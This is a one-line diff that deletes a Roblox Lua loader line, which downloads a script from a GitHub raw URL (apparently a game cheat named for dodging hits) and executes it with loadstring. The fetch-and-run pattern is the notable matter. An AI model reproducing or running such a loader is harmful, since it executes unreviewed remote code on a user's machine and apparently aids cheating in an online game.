@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/antoniop1337/RobloxStuff/main/WZdodge1hit.lua"))()
